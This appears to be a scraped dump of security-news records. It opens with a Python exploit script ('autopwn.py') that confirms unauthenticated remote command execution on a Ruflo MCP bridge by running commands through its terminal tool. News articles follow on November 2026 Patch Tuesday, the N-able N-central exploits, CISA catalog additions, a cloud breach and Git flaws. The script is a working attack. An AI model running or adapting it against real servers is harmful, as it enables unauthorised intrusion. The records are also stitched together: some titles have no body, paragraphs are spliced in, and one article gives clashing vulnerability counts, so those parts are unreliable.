articles.full_text: #!/usr/bin/env python3 # ============================================================================= # autopwn.py # (RufRoot): Unauthenticated RCE in the Ruflo MCP Bridge # ============================================================================= # Usage: python3 autopwn.py <target_ip> # Example: python3 autopwn.py 192.168.x.x # ============================================================================= import sys import json import socket import subprocess import tempfile import os import time import base64 import urllib.request import urllib.error # --------------------------------------------------------------------------- # Configuration # --------------------------------------------------------------------------- MCP_PORT = 3001 LPORT = 4444 TIMEOUT = 10 RED = "\033[0;31m" GREEN = "\033[0;32m" YELLOW = "\033[1;33m" BLUE = "\033[0;34m" NC = "\033[0m" def log(msg): print(f"{GREEN}[+]{NC} {msg}") def info(msg): print(f"{BLUE}[*]{NC} {msg}") def warn(msg): print(f"{YELLOW}[!]{NC} {msg}") def fail(msg): print(f"{RED}[-]{NC} {msg}"); sys.exit(1) # --------------------------------------------------------------------------- # Helpers # --------------------------------------------------------------------------- def mcp_call(target, endpoint, method, params=None): """Send a JSON-RPC 2.0 request to the MCP bridge.""" url = f"http://{target}:{MCP_PORT}{endpoint}" payload = json.dumps({ "jsonrpc": "2.0", "id": 1, "method": method, "params": params or {} }).encode() req = urllib.request.Request( url, data=payload, headers={ "Content-Type": "application/json", "Accept": "application/json, text/event-stream", }, method="POST" ) try: with urllib.request.urlopen(req, timeout=TIMEOUT) as resp: return json.loads(resp.read().decode()) except urllib.error.URLError as e: fail(f"Request to {url} failed: {e}") def rce(target, command): """Execute a command via ruflo__terminal_execute.""" resp = mcp_call(target, "/mcp/devtools", "tools/call", { "name": "ruflo__terminal_execute", "arguments": {"command": command} }) try: # The bridge returns JSON inside a text field inside JSON # Outer: resp["result"]["content"][0]["text"] -> JSON string # Inner: that JSON string has another "content" array outer_text = resp["result"]["content"][0]["text"] middle = json.loads(outer_text) # middle is {"content": [{"type": "text", "text": "{...}"}]} inner_text = middle["content"][0]["text"] inner = json.loads(inner_text) return inner.get("output", "").strip() except Exception: # Fallback: return whatever we got as string return str(resp) def get_local_ip(): """Get the local IP that can reach the target.""" s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) try: s.connect(("8.8.8.8", 80)) return s.getsockname()[0] finally: s.close() # --------------------------------------------------------------------------- # Banner # --------------------------------------------------------------------------- def banner(): print(f"{BLUE}") print(" ==================================================") print(" autopwn - CVE-2026-59726 (RufRoot)") print(" Unauthenticated RCE in the Ruflo MCP Bridge") print(" ==================================================") print(f"{NC}") print() # --------------------------------------------------------------------------- # Steps # --------------------------------------------------------------------------- def step1_check_bridge(target): info("Step 1/3 - Checking MCP bridge reachability...") try: resp = urllib.request.urlopen( f"http://{target}:{MCP_PORT}/health", timeout=TIMEOUT ) data = json.loads(resp.read().decode()) assert data.get("service") == "mcp-bridge" log(f"Bridge is up: {data['service']} v{data['version']} " f"({data['tools']['total']} tools)") except Exception as e: fail(f"Bridge not reachable: {e}") def step2_verify_unauth(target): info("Step 2/3 - Verifying unauthenticated tools/list...") resp = mcp_call(target, "/mcp/devtools", "tools/list") tools = [t["name"] for t in resp.get("result", {}).get("tools", [])] if "ruflo__terminal_execute" not in tools: fail("ruflo__terminal_execute not found in tools/list") log(f"tools/list returned {len(tools)} tools without authentication") log("ruflo__terminal_execute is present (CWE-306 confirmed)") def step3_rce(target): info("Step 3/3 - Confirming RCE via ruflo__terminal_execute...") output = rce(target, "id && hostname") if "uid=" not in output: fail(f"RCE did not return expected output: {output}") log(f"RCE confirmed: {output.split(chr(10))[0]}") # --------------------------------------------------------------------------- # Main # --------------------------------------------------------------------------- def main(): banner() if len(sys.argv) != 2: print(f"Usage: python3 autopwn.py <target_ip>") sys.exit(1) target = sys.argv[1] info(f"Target : {target}:{MCP_PORT}") info(f"CVE : CVE-2026-59726 (Ruflo MCP Bridge, pre-3.16.3)") print() step1_check_bridge(target) step2_verify_unauth(target) step3_rce(target) if __name__ == "__main__": main()

articles.title: November Patch Tuesday boasts over 1,000 bugs but only one zero-day so far
articles.context: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch
articles.full_text: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch. Jake Knott, head of threat intelligence at exposure management firm watchTowr, succinctly said in an email to The Register: “Maybe we should just go home.” “Most security teams haven’t quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and ‘2shell’-branded everything, and we’re yet again at another Patch Tuesday,” Knott told us. Starting with the zero-day: It’s an Outlook spoofing vulnerability, tracked as CVE-2026-124194, and it only garnered a 6.5 out of 10 CVSS rating. But as Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative, warns, don’t let the score or the name lull you into thinking it’s OK to put off patching this one. “It’s labeled spoofing, but the impact is bigger than the name suggests,” Childs said in his monthly Patch Tuesday review. “An attacker sends a specially crafted message file and convinces a user to open it,” he wrote. “Outlook then connects to an attacker-controlled network location without showing the usual external-content warning, which discloses the user’s NTLMv2 hash. The attacker can use that hash to authenticate as the user.” Microsoft marked CVE-2026-124194 as exploited, but per usual didn’t say when the attacks started, who is battering this bug, and what they are doing with the access post exploitation. These details will likely start trickling out soon. Plus, now that there’s a public fix, other miscreants are undoubtedly already scanning for vulnerable versions and reverse engineering the patch for their own attack purposes. So prioritize this fix, and keep an eye on your inbox for any suspicious files. Back-to-back months of 1K+ CVEs Despite the second month of more than 1,000 CVEs (October had 1,474), CVE-2026-124194 is the only one under active exploitation, and none of the 1,094 are listed as publicly known. Childs says this shouldn’t give organizations “false comfort.” “Logging back-to-back months above 1,000 CVEs proves automated bug-hunting has permanently reset patch volume,” he told The Register. “With AI making patch-diffing and exploit generation near-instant, the threat window opens the minute these updates drop.” For defenders, this means two things, Childs added. “What defenders need to know and do right now is abandon broad triage and take immediate defensive action: patch Exchange and Domain Controllers (LDAP/Kerberos) first to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on your cloud services,” he said. Zero-click threats There are two zero-click threats in this month’s batch of fixes: CVE-2026-116928 and CVE-2026-119958. Both are critical, carrying 9.8 CVSS ratings, in part because they don’t require any user interaction to exploit. CVE-2026-116928 is an out-of-bounds write in Microsoft Windows Search Component that could lead to remote code execution. An unauthenticated attacker could abuse this search feature in Exchange “by sending an email containing a specially crafted attachment,” Redmond warned. “Exchange automatically processes the attachment for indexing, so the recipient does not need to open the email or attachment. Successful exploitation could allow the attacker to execute code with the permissions of the affected processing service.” CVE-2026-119958 is an out-of-bounds write vulnerability in Windows' implementation of the Lightweight Directory Access Protocol (LDAP) that could allow unauthenticated attackers to execute code remotely without user interaction. This one can be exploited by sending specially crafted LDAP requests to vulnerable systems, potentially compromising domain controllers. Childs also counts 30 CVEs that pose a “wormable risk,” requiring zero authentication and zero user interaction over a network. All of those are listed in his blog, so prioritize fixing those as well. And…Xbox remote code execution And finally, for funsies, a critical flaw in the Windows Xbox Live Networking Service, CVE-2026-112967, that could allow remote code execution also made this month's roundup. It's a heap-overflow vulnerability with a 9.8 CVSS rating that doesn't require authentication or user interaction to exploit. So don't take a gaming break between testing November's updates. Or, if you do, at least make sure vulnerable Windows systems running the Xbox Live Networking Service are on your patching list, too. ®

articles.title: November Patch Tuesday: An Overflowing Cornucopia of CVEs
N-able N-central gets emergency fix two days after 33 exploits published
articles.context: N-able has taken its hosted N-central remote monitoring and management (RMM) platform offline worldwide and shipped an emergency hotfix after a security researcher released 33...
articles.full_text:
N-able has taken its hosted N-central remote monitoring and management (RMM) platform offline worldwide and shipped an emergency hotfix after a security researcher released 33 zero-day exploits for the software, including attack chains that could let unauthenticated attackers take over servers.

N-central is used by managed service providers (MSPs) and enterprise IT teams to remotely manage, patch, and support endpoint systems, so a compromised server can expose every computer under its control. N-able said it took the hosted environments offline as a precaution and advised customers using the on-premises version to shut down their servers until it released the fix, N-central 2026.4 HF2, on Tuesday.

The vulnerabilities were disclosed late Sunday by an offensive security researcher named Sean Bales who uses the GitHub handle Oracle-Security. The release includes proof-of-concept exploit chains that require no authentication and could result in command execution as the service account and, in some cases, root access.

N-able said it has already observed scanning activity associated with the published exploits but has not seen evidence that any customer environment has been successfully exploited. Censys found 1,728 internet-exposed N-central instances, and security firm Previdian recorded 68 exploitation attempts against one of its honeypots from a single IP address within about 18 hours of the publication.

Exploit chains lead to remote code execution

The 33 exploits, which the researcher dubbed Able2Shell, are organized into four attack chains. The most severe requires no authentication and abuses an XML external entity (XXE) flaw in a service-import function to steal a trusted local session, reset an account password, and execute commands as the nable service user. The same chain can create a Default Administrator account with credentials chosen by the attacker, giving them full control of the appliance.

Two other attack chains start from a predictable appliance passcode that lets an anonymous attacker inject malicious patch metadata. When an administrator opens the patch details, a stored cross-site scripting (XSS) payload runs in their browser and invokes a command-execution interface as the nable user. The administrator’s session can also be hijacked through the same flaw to submit a crafted audit-export configuration that runs commands as root.

A fourth chain writes an executable web page into the server’s web directory through a directory traversal flaw in a software repository feature, then escalates to root through a passwordless installer that executes a configuration from a directory the nable user can write to.

Bales tested all of the exploits against N-central Appliance 2026.4.0.31, a pre-release build, and noted in the repository’s documentation that most, if not all, of the flaws should work on previous versions, including the most up-to-date release.

N-able has not confirmed how many of the 33 flaws it could reproduce, but the new hotfix lists 7 CVEs:

CVE-2026-125883 — Multiple XXE vulnerabilities

CVE-2026-125878 — Multiple OGNL injection vulnerabilities

CVE-2026-125879 — Local privilege escalation to root via nable-writable syslog-ng config

CVE-2026-125880 — Stored XSS via MMS3 patch metadata (admin context)

CVE-2026-125881 — Schema-hint SSRF via service import schema validation

CVE-2026-125882 — RCE via file repository upload path traversal (Credit Nate Fair, Sprocket Security)

CVE-2026-91000 — Insecure IPC Channels lead to local privilege escalation

Attacks likely to follow

N-central has been targeted by attackers in the past and the Able2Shell disclosure is the fourth time in 15 months that N-able has been forced to do an emergency response. In August 2025, the company patched two flaws tracked as CVE-2025-8875 and CVE-2025-8876 that were exploited in the wild as zero-days.

In August this year, the company patched an authentication bypass flaw tracked as CVE-2026-18556 that was exploited as a zero-day to deploy ransomware, but the patch was incomplete and attackers quickly found a bypass: CVE-2026-18577. Microsoft attributed the ransomware attacks that abused the flaw to Storm-1175, a financially motivated group linked to China that deployed the StormEncryptor ransomware on MSP-managed systems.

In September, security firm Huntress discovered that a fully patched N-central server had been compromised through a new chain of access-control flaws tracked as CVE-2026-86206 and CVE-2026-86207. A day later N-able disclosed CVE-2026-86218, a pre-authentication remote code execution flaw rated 10.0 on the CVSS scale that had also been exploited.

N-able claims more than 25,000 MSP partners and telemetry from more than 11 million endpoints.

What customers should do

With the N-central 2026.4 Hotfix 2 available, N-able said on-premises customers should upgrade as soon as possible, and all customers — hosted and on-premises — must upgrade their Agents and Probes to restore compatibility between the two.

Security firm Huntress advised N-central administrators to review authentication activity from Nov. 8 onward, look for administrator accounts, scripts, and remote-access sessions they did not create, and assess every client network managed by the server, not just the server itself. Huntress also cautioned that patched servers may not display a new version number, so administrators should verify fixes against N-able’s guidance rather than the version string.

ThreatDefence recommended preserving logs and server snapshots before making any changes, then rotating credentials for administrator and technician accounts, asset-discovery databases, agent registration tokens, and ecosystem agent keys once the server is restored.

articles.title: Patch Tuesday - November 2026
articles.context: 5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted...
articles.full_text:
Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 1,102 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve.

The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future.

Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month.

Outlook: zero-day spoofing

Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over to scan the handwriting on the back, which looks vaguely familiar. It’s addressed to you, but you can’t make out the signature, and the message is short and generic. Is that real handwriting, or has this been printed? Probably marketing material.

You put the card in the recycling and, since life is busy, you move on and forget about it. Somehow, you remain entirely unaware that, immediately after reading the postcard, you took out your phone and sent high-resolution images of your front door key to a number you’ve never contacted before.

Is this sketch just some rather questionable science fiction? Yes, hopefully, but what if that non-specific postcard was instead a malicious file in your Outlook inbox? Now we’re talking about CVE-2026-124194, an exploited-in-the-wild spoofing vulnerability. Merely opening a specially crafted malicious file causes Outlook to silently connect to an attacker-controlled location and leak the user’s NTLM v2 hash. All supported versions of classic Outlook receive patches.

The relatively low CVSS v3.1 base score of 6.5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted campaigns by more sophisticated threat actors.

The NTLM v2 hash can be relayed live to impersonate the user against another service, at least where those services do not implement adequate safeguards such as message signing for SMB or LDAP, as well as Extended Protection for Authentication for Exchange or Active Directory Certificate Services. Alternatively, the NTLM v2 hash can be cracked offline by a motivated attacker to retrieve the underlying credential. The Preview Pane is not a vector, which will help limit the real-world impact somewhat.

Windows Schannel: critical pre-auth RCE

A pre-authentication remote code execution (RCE) vulnerability in Windows will always attract attention. CVE-2026-119952 allows an attacker to execute code on a target system by sending specially crafted malicious packets. Since the vulnerable component is Schannel, which is Microsoft’s implementation of Transport Layer Security (TLS), attackers may not have to look very far to find vulnerable endpoints.

The advisory provides some comfort by pointing out that specific conditions are required for exploitability, which reduces the likelihood of broad exploitation, but the advisory still assesses exploitation as more likely, so Microsoft presumably expects that the development of reliable exploit code is feasible. In many cases, there will be no need for an attacker to have an existing foothold on the same subnet.

The execution context likely depends on the vulnerable service, which points to the evergreen need for least privilege architecture, but it also means that we cannot exclude the possibility of pre-auth RCE as SYSTEM in some cases.

Exchange/Windows Search: critical pre-auth RCE

Could someone take control of your Exchange server by sending a single email? In short: yes. Microsoft offers customers tight integration between various business-critical components. Exchange running on Windows is Microsoft on Microsoft, and the Windows Search component indexes email on behalf of Exchange.

An attacker aiming to exploit CVE-2026-116928 relies on this helpful synergy to achieve pre-auth RCE on the server by sending a malicious attachment, which Exchange will process automatically. How’s that for low attack complexity Although the advisory does not specify the context of execution, we should assume SYSTEM, since several of the services which might be involved do run with a high privilege level.

Since the patches are for Windows OS rather than Exchange itself, there’s no need to worry about which version of Exchange you’re running, so long as you are running only Exchange Subscription Edition, since all previous versions of Exchange are now fully beyond end of support.

Microsoft lifecycle update

There are fewer Microsoft product lifecycle changes in November 2026 than last month. As of Nov 11, 2026, .NET 8 Long Term Servicing channel moves past its release end date, along with PowerShell 7.4 LTS, and the 23H2 versions of the Enterprise, Education, and IoT editions of Windows 11.

articles.title: Microsoft Fixes Nearly 1,100 Security Vulnerabilities
articles.context: This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers,...
articles.full_text:
Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers, including Adobe, Apple, Google and Mozilla.

Image: Shutterstock.com. Diorama by @zepp1969.

November’s patch release from Redmond tackles 1,093 vulnerabilities, fixing 63 “critical” flaws that can be exploited to seize control over a Windows system with little or no help from users. Nearly half of those critical bugs are remote code execution vulnerabilities. Overall, 535 of the flaws addressed this month allow an attacker to elevate their privileges on a vulnerable device.

This latest round of updates means Microsoft has shipped more than 5,100 security patches so far this year, a staggering number considering that a year ago Microsoft was averaging around 100 patches per month. Microsoft credits advances in artificial intelligence for helping to find (and fix) such a large volume of security bugs in recent months. Last month, Microsoft pushed more than 1,400 fixes.

According to Redmond, just one of the flaws is already seeing active exploitation: CVE-2026-124194, a spoofing bug in Outlook. The advisory for CVE-2026-124194 says it affects Microsoft 365 Apps for Enterprise and editions of Microsoft Office.

Several other major software makers pushed security updates this week to fix critical weaknesses in their products. Apple on Monday released out-of-cycle security updates to fix at least nine vulnerabilities in iOS/iPadOS, macOS, watchOS and visionOS. Among the weaknesses reportedly fixed in Apple’s release include an iMessage flaw that could let a remote attacker join a group chat and receive its messages; the updates also fix a separate iMessage flaw that could let someone added to a group access messages sent before they joined.

Lee Neely, an instructor at the SANS Institute, noted that Apple backported the fix to iOS 18.

“I take notice when Apple releases fixes to more than two versions,” Neely wrote in a SANS newsletter today. “You really need to get to version 27.2.1 of their OSes and push folks who are holding onto devices which cannot run the current version. The best plan often involves setting an upgrade date for old hardware. Run through all your Apple devices and make sure everything is up to date, don’t assume the fixes went out automatically.”

Google this week released Chrome version 157.0.8103.50, which resolves nine security holes, including CVE-2026-125350, the sixth zero-day vulnerability this year for Chrome (this bug also being patched in Chromium-based browsers like Edge). The latest Chrome version follows its November 3 release, which fixed 213 vulnerabilities. A new version of Mozilla Firefox out today (Firefox 160) resolves almost 100 CVEs, about half of them high severity.

Adobe today released patches for at least 110 vulnerabilities across a range of products, with nearly half of the flaws rated high severity. Adobe said there is no evidence any of the security holes it addressed this month are being actively exploited.

Chris Goettl, vice president of product management at Ivanti, said it’s easy for security teams at large enterprises to feel overwhelmed by the volume and criticality of patches from Microsoft lately. But he notes that while some 95,000 vulnerabilities have been assigned CVEs this year across all vendors, only 217 have so far this year been added to the Known Exploited Vulnerabilities (KEV) list maintained by the U.S. Cybersecurity and Infrastructure Security Agency (CISA).

“Roughly four in ten of this year’s exploited vulnerabilities sit in operating systems, endpoint software, browsers, and server platforms, which a continuous patch strategy can close quickly,” Goettl said.”The rest calls for exposure management alongside patching, especially the 44% that sit in edge devices and IT management or remote access tools, the internet-facing systems that hold privileged access. Teams that can quickly identify those assets, confirm exposure and act on confirmed exploitation can focus on the small slice of vulnerabilities attackers are actively using, while the rest stays on the normal patch cadence.”

Please don’t neglect to back up any important data if you haven’t recently; generally speaking, this is a task best accomplished before applying operating system updates. As ever, if you experience any issues applying this month’s bundle of love from Microsoft, please drop a comment about it in the space below.

articles.title: U.S. CISA adds IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack flaws to its Known Exploited Vulnerabilities catalog
articles.context: I found no public confirmation of exploitation in the wild or information identifying attackers at the time of writing
articles.full_text:
U.S. Cybersecurity and Infrastructure Security Agency (CISA) adds IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack flaws to its Known Exploited Vulnerabilities catalog.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog:

Below are the flaws added to the catalog:

CVE-2026-102895 GPUStack Improper Authentication Vulnerability

CVE-2026-116779 SignalWire FreeSwitch Code Injection Vulnerability

CVE-2026-123158 OpenBSD OpenSSH Unexpected Status Code or Return Value Vulnerability

CVE-2026-123218 IBM Aspera Faspex Incorrect Authorization Vulnerability

The first issue added to the catalog, CVE-2026-102895 (CVSS score of 9.8), is an improper authentication vulnerability affecting GPUStack, an open-source platform used to manage GPU clusters and AI model deployments. The flaw allows remote, unauthenticated attackers to bypass authentication and obtain administrator privileges by making requests appear to originate from the local system. Successful exploitation can expose sensitive information, create persistent administrator API keys, modify configurations and potentially execute arbitrary code. Exploitation has been observed in the wild against a GPUStack 2.1.1 deployment. Security researcher Javier Sixto reported the in-the-wild exploitation, but no specific threat group has been identified. The issue affects versions before 2.2.0.

The second issue, CVE-2026-116779 (CVSS score of 9.8), is a code injection vulnerability in SignalWire FreeSWITCH, an open-source communications platform. The flaw allows attackers to send specially crafted SIP MESSAGE requests and abuse the API chat protocol to execute FreeSWITCH API commands. Depending on the configuration, this can expose credentials and configuration data, manipulate telephone calls and execute operating system commands with the privileges of the FreeSWITCH process. SignalWire confirmed that exploitation has been observed in the wild. The vulnerability was added to CISA’s KEV catalog on November 9, 2026, but no information identifying the attackers or a specific campaign has been disclosed. FreeSWITCH versions before 1.11.3 are affected.

The third issue, CVE-2026-123158 (CVSS score of 8.1), is an authentication bypass vulnerability affecting OpenSSH. Under specific conditions, when OpenSSH runs on Linux systems using the musl C library without Pluggable Authentication Modules (PAM), the SSH server may incorrectly interpret password input as a password hash. A remote, unauthenticated attacker can exploit the flaw by submitting a specially crafted password to bypass authentication and access affected accounts. CISA added the vulnerability to its KEV catalog on November 6, 2026, indicating that exploitation has been observed. However, no specific threat actor or attack campaign has been publicly identified. OpenSSH versions before 10.6p2 are affected.

The fourth issue, CVE-2026-123218 (CVSS score of 9.8), is an incorrect authorization vulnerability affecting IBM Aspera Faspex 5. It allows an authenticated user to craft a specific message that bypasses authorization checks and potentially gain full administrative privileges. Successful exploitation could give attackers access to sensitive information and allow them to modify or disrupt the affected system. IBM disclosed the vulnerability on November 7, 2026, and released a fix in Aspera Faspex 5.0.19 PL1. I found no public confirmation of exploitation in the wild or information identifying attackers at the time of writing. Versions 5.0.0 through 5.0.19 are affected.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the two vulnerabilities by November 12, 2026.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, CISA)

As the year approaches its final stretch, Microsoft’s November 2026 Patch Tuesday highlights the continued importance of proactive vulnerability management. This month’s security updates address vulnerabilities across the Microsoft ecosystem, reinforcing the need for organizations to promptly identify, prioritize, and remediate security risks.

This month’s release includes fixes for several vulnerabilities that could potentially enable remote code execution, privilege escalation, or denial-of-service attacks. As always, timely patch deployment is crucial to reduce exposure and ensure systems remain resilient against exploitation attempts.

In this month’s updates, Microsoft addressed 1235 vulnerabilities, including 63 critical and 1029 important-severity vulnerabilities. In the updates, Microsoft has addressed 142 vulnerabilities impacting Microsoft Edge (Chromium-based).

In this month’s updates, Microsoft has addressed only one vulnerability that has been exploited in the wild.

This Patch Tuesday, Qualys InstaScan showed customers their November findings 40 minutes before Microsoft’s own release notes page was available.

articles.title: Microsoft releases Windows 10 KB5131096 extended security update
articles.context: The update also includes fixes released as part of today's November 2026 Patch Tuesday, which addressed 1,235 vulnerabilities across Microsoft's products, including one actively...
articles.full_text:
Microsoft released the Windows 10 KB5131096 extended security update, which includes this month's November 2026 Patch Tuesday fixes and a few bug fixes and changes.

If you are running Windows 10 Enterprise LTSC or are enrolled in the ESU program, you can install this update as normal by going to Settings, clicking Windows Update, and manually running a 'Check for Updates.'

After installing this update, Windows 10 will be updated to build 19045.7846, and Windows 10 Enterprise LTSC 2021 will be updated to build 19044.7846.

What's new in Windows 10 KB5131096

Microsoft no longer releases new features for Windows 10, and the KB5131096 update mainly includes security updates and bug fixes.

The update also includes fixes released as part of today's November 2026 Patch Tuesday, which addressed 1,235 vulnerabilities across Microsoft's products, including one actively exploited Outlook zero-day flaw.

The complete list of fixes and changes in KB5131096 is below:

[Date and Time] This update adjusts daylight saving time (DST) rules for Cuba for the extended 2026-2027 DST period. Cuba remains on UTC-04:00 and doesn't observe the November 2026 and March 2027 transitions. It returns to UTC-05:00 in November 2027 and resumes its regular seasonal schedule in 2028.

For the latest DST and time zone guidance, see the Daylight Saving Time & Time Zone Blog.

[Printing] - Fixed: Adding a printer published in Active Directory through Settings > Bluetooth & devices > Printers & scanners > Add device might fail with error 87, "The parameter is incorrect." This issue was introduced by the October 2026 update and does not generally affect existing printers or printing.

[Remote Desktop]

Fixed: The “Specify thumbprints of certificates representing trusted .rdp publishers” policy could not be configured successfully through Microsoft Intune.

Fixed: Remote Desktop shadow connections might fail with an “Unspecified error” on Windows Server 2016 and Windows Server 2012 R2 after installing the October 14, 2026, update.

[Windows PowerShell] This update strengthens security for PowerShell script signing and signature verification by introducing stricter encoding validation. As a result, scripts containing invalid UTF-8 encoding might fail signature validation, even if they were previously accepted. To resolve this issue, review the affected scripts, save them using valid UTF-8 encoding with a byte order mark (BOM), and sign them again. For further guidance, see Encoding Guidance for Signed PowerShell Scripts.

Microsoft says it has now resolved all known issues affecting USB Audio Class 1.0 devices introduced by the September 2026 Windows security updates.

The problems caused some devices to stop producing audio, fail to start with Code 10 errors, or experience unresponsive volume controls and sound settings.

Microsoft previously released an emergency out-of-band update on September 14 to fix issues affecting 8-channel and 3D audio modes.

The remaining audio issues have now been fixed in today's Windows 10 update.

articles.title: Hackers exploit trusted AWS access to breach multiple cloud environments
articles.context: The researchers found that the attacker had compromised two Qubole IAM users and assumed otherwise unused roles in multiple customers’ AWS accounts that had previously been...
articles.full_text:
A threat actor used compromised identity and access management (IAM) credentials for a Qubole big data platform's AWS account to access and exfiltrate data from multiple customers' AWS environments.

The campaign ran between October 14 and 26, and affected tens of companies whose AWS environments had IAM roles configured to trust an AWS account associated with Qubole.

Qubole is an enterprise cloud data processing and analytics platform that helps companies manage large datasets and run machine learning workloads. It also offers AWS integration to allow computing resource management.

Companies can grant third-party providers such as Qubole access to their AWS resources by creating cross-account IAM roles. Trust policies determine which external AWS accounts can take these roles, and permissions are set to define the resources and actions allowed.

Researchers at cloud security company Wiz explain that external providers use AWS’s STS AssumeRole API to obtain temporary credentials for accessing customers' resources in the cloud.

Wiz started to investigate the attack after data security and governance company Sentra shared information about suspicious activity observed in some of its customers' environments. The investigation also included cybersecurity company Mandiant.

The researchers found that the attacker had compromised two Qubole IAM users and assumed otherwise unused roles in multiple customers’ AWS accounts that had previously been configured to trust Qubole’s account, granting them access within the role’s permissions.

Wiz says the attacker then surveyed cloud resources, retrieved secrets from AWS Secrets Manager and SSM Parameter Store, and read Lambda environment variables.

They then used the TruffleHog tool to validate discovered AWS keys, Microsoft Entra ID client secrets, and Okta client credentials.

Once they gained deeper access, they downloaded data from all accessible S3 buckets in the AWS environment, following an opportunistic approach rather than carefully targeting specific data.

“The sequence was consistent across environments: assume a role, call ListBuckets to see what the role could reach, call ListObjects and HeadObject to enumerate and inspect the contents, then call GetObject to download them,” Wiz explains.

The report does not specify the exact method used to compromise the Qubole accounts or the number of downstream victims. However, Sentra confirmed dozens of victims and millions of files stolen from one customer alone.

Sentra says the attacker moved quickly and collected secrets at a rate of 100 passwords and keys in seven minutes.

BleepingComputer could not find a public announcement from Qubole about this incident. We have emailed the firm for more information about the attack and await their response.

Potentially impacted administrators are advised to review CloudTrail from October 1 onward for suspicious access from Qubole’s AWS account, investigate subsequent secret and S3 access, rotate exposed credentials, and revoke active role sessions.

It is also recommended to remove unused integrations and restrict remaining roles’ permissions, trusted identities, and permitted source networks.

articles.title: Git Patches Flaw That Lets Malicious Repositories Execute Code During Recursive Clones
articles.context: A flaw in Git can let a malicious repository run an attacker's code on a computer that clones it recursively, together with its submodules
articles.full_text:
A flaw in Git can let a malicious repository run an attacker's code on a computer that clones it recursively, together with its submodules. The Git project fixed it this week in Git 2.56.1, with matching fixes for the 2.50 through 2.55 series in 2.50.2, 2.51.3, 2.52.1, 2.53.1, 2.54.1 and 2.55.1.

The flaw, tracked as CVE-2026-111760, is an integer truncation in how Git handles its index. An extremely long path in a repository can pass Git's safety check, but Git then writes it to disk under a shorter name that an attacker can set to .git.

This lets an attacker replace a submodule's .git file with a symbolic link to a folder holding malicious hooks or configuration. Hooks are programs Git runs at set points, so once Git uses that folder, the attacker's code can run.

Submodules matter here because Git refuses to replace a .git folder with a symbolic link, but in a freshly cloned submodule, .git is a file.

The fixed versions, listed in the Git project's release announcement, refuse such extremely long paths before their length can be cut short.

GitHub, which ships Git in its own tools, explained the fixes in a detailed write-up. It advises installing a fixed version from your operating system or Git distributor, and updating any app that ships its own copy of Git.

The company has already applied the fixes to github.com and GitHub Enterprise Cloud. For GitHub Enterprise Server, they are in versions 3.19.15, 3.20.11, 3.21.9 and 3.22.4.

Fixed versions of GitHub Desktop and the GitHub Copilot app are being prepared. GitHub Codespaces and GitHub Actions will also get the fixed Git.

Git for Windows had not released a version based on Git 2.56.1 as of Tuesday at 19:09 UTC, a check of its release tags by The Hacker News found.

Until a fixed version is installed, GitHub suggests these steps, which do not replace the fixes:

Clone only from servers you trust.

Do not recursively clone repositories you do not trust.

Do not merge content or tags you do not trust.

Do not process binary patches or fast-import streams from sources you do not trust.

The Git releases also fix five other flaws:

CVE-2026-113408: When someone clones an empty repository over Git protocol v2, a malicious server can send a branch name that contains path traversal. With the files reference backend, a later update to that branch can then write outside Git's reference folder.

CVE-2026-114467: Merging a tag that carries more than two GPG signatures corrupts Git's stack memory and can cause a denial of service. Hosting services that run such merges for users may also be affected.

CVE-2026-114469: A binary patch that expands to a very large size can get past Git's patch size limit of about 1 GiB and crash Git with an out-of-bounds read.

CVE-2026-105437: A very large merge, with many conflicts and a large conflict-marker-size attribute, can make Git write past the end of a buffer that is too small, corrupting heap memory.

CVE-2026-114466: Three git fast-import features, rewrite-submodules-from, rewrite-submodules-to and export-pack-edges, could be used to read arbitrary files or to create files and add data to them. Git now rejects them in an input stream unless --allow-unsafe-features is set.

GitLab, which assigned CVE-2026-105437, said code-hosting servers are most likely to be targeted through git merge-tree. A server may run that command to check whether a pull or merge request can be merged.

The conflict-marker-size attribute can be set in a .gitattributes file committed to a repository. If a server reads attributes from the repository, any user who can push branches and open a pull or merge request can trigger the flaw.

As a workaround for this flaw, servers that cannot upgrade yet can add conflict-marker-size=7 to each repository's info/attributes file, or turn off those merge checks for untrusted repositories.

articles.title: SGLang RCE Exploit Breaches NEAR AI, Steals Data From 18 Agents and About 100 Users
articles.context: An attacker exploited a remote code execution flaw in SGLang, an open-source inference engine, and ran code on one of NEAR AI's inference servers last Sunday
articles.full_text:
An attacker exploited a remote code execution flaw in SGLang, an open-source inference engine, and ran code on one of NEAR AI's inference servers last Sunday.

